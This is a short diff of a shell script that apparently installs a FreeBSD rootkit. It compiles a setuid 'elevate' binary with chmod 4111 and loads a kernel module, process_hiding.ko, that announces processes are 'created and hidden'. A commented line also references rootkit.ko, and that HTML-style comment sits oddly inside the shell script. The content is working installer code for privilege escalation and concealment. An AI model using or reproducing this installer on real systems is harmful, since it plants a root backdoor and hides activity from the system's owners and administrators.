@@ -6,8 +6,10 @@
 #!/bin/sh
 REMOTE_IP=$1
 set -e
-cc -o ../elevate/elevate ../elevate/elevate.c
-chmod 4111 ../elevate/elevate
+cc -o ../../elevate ../elevate/elevate.c
+chmod 4111 ../../elevate
+echo "Elevation compiled"
 <!-- kldload -v ./src/kld/rootkit.ko -->
-echo "elevation compiled"
+kldload -v ../process_hiding/process_hiding.ko
+echo "Process hiding created and hidden"
 exit 0
